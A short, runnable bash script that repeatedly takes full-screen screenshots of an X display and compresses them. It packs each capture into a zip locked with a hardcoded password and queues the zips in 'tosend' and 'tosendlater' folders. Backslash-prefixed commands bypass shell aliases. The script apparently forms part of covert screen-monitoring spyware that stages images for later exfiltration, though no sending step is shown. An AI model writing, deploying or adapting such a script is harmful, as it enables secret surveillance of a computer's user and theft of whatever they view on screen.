# 1 - time to sleep

while true
do
	DATA=`\date +"%Y-%m-%d-%H-%M-%S"`
	\mkdir "screenshot/$DATA"
	# screenshot:
	\import -window root -display :0 screenshot/$DATA/screenshot.bmp
	\sleep 1
	\convert -quality 75 screenshot/$DATA/screenshot.bmp screenshot/$DATA/screenshot.jpg
	# convert -type grayscale -quality 60 screenshot/$DATA/screenshot.bmp screenshot/$DATA/screenshot.png
	\sleep 1
	\rm screenshot/$DATA/screenshot.bmp
	\zip -9 -r tosend/screenshot-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g screenshot/$DATA
	\mv tosend/screenshot-$DATA.zip tosendlater/screenshot-$DATA.zip
	\rm screenshot/$DATA/*
	\rmdir "screenshot/$DATA"
	unset DATA
	\sleep $1
done
